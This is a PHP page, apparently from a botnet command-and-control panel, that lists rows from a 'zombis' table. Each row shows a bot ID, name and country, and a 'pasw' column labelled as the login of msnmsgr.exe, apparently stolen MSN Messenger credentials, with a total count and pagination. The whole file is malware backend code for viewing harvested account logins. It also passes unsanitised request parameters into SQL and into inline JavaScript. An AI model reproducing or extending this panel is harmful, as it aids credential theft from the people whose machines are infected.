<?php 

require_once('../includes.php'); 




$RegistrosAMostrar=100;

if(isset($_GET['pag'])){
	$RegistrosAEmpezar=($_GET['pag']-1)*$RegistrosAMostrar;
	$PagAct=$_GET['pag'];
}else{
	$RegistrosAEmpezar=0;
	$PagAct=1;
	
}




	$Modems = $DB->Select("SELECT * FROM zombis LIMIT " . $RegistrosAEmpezar . " , " . $RegistrosAMostrar);
	


$Totales = $DB->Select("SELECT * FROM zombis"); 

for($i=0; $i<count($Modems); $i++){
	$Modemstxt .= '
	 <tr>
	    <td><div align="center"><font color="#CCCCCC">'.$Modems[$i]['id'].'</font></div>
	<font color="#CCCCCC"></td>
		<td></font><div align="center"><font color="#CCCCCC">'.$Modems[$i]['name'].'</font></div>
	<font color="#CCCCCC"></td>
		<td></font><div align="center"><font color="#CCCCCC">'.$Modems[$i]['pais'].'</font></div>
	<font color="#CCCCCC"></td>
    	<td></font><div align="center"><font color="#CCCCCC">'.$Modems[$i]['pasw'].'</font></div></td>
  	</tr>	' ;
}

$NroRegistros=mysql_num_rows(mysql_query("SELECT * FROM zombis"));
$PagAnt=$PagAct-1;
$PagSig=$PagAct+1;
$PagUlt=$NroRegistros/$RegistrosAMostrar;
$Res=$NroRegistros%$RegistrosAMostrar;
if($Res>0) $PagUlt=floor($PagUlt)+1;

?>






<div id="div_pais" name="div_pais" style="color:#FF0000">
<font face="Verdana" size="2">Login MSN(Messenger): <?php echo count($Totales); ?> 
</font><br>
&nbsp;</div>

<table width='97%' border='1' cellspacing='0' cellpadding='3' style='border: 1px solid lightgray; font-size: 9px; border-collapse: collapse; ' bordercolor="#C0C0C0" bgcolor="#000000">
  <tr>
    <td width="2%"><div align="center">
	<font size="1" face="Verdana" color="#FFFFFF"><b>ID</b></div></td>
    <td width="12%"><div align="center"><b>
		<font size="1" face="Verdana" color="#FFFFFF">Bot's Name
	</font>  </b>  </div></td>
	<td width="6%"><div align="center"><b>
		<font size="1" face="Verdana" color="#FFFFFF">Pais
	</font>  </b>  </div></td>
		<td width="79%"><div align="center"><b>
			<font size="1" face="Verdana" color="#FFFFFF">Login de msnmsgr.exe
	</font>  </b>  </div></td>
  </tr>
<?php echo $Modemstxt ; ?>
</table>

<br>

<?php
echo '<div align="center"><font face="Verdana" size="1" color="#FFFFFF" style="cursor:pointer">' ;
echo "<a onclick=\"EmailPag('1' , '".$_GET['pais']."')\">First</a> ";
if($PagAct>1) echo "<a onclick=\"EmailPag('$PagAnt' , '".$_GET['pais']."')\">Previous</a> ";
echo "<strong>Pagina ".$PagAct."/".$PagUlt."</strong>";
if($PagAct<$PagUlt)  echo " <a onclick=\"EmailPag('$PagSig' , '".$_GET['pais']."')\">Following</a> ";
echo "<a onclick=\"EmailPag('$PagUlt' , '".$_GET['pais']."')\">Last</a>";
echo '</font></div>' ;
?>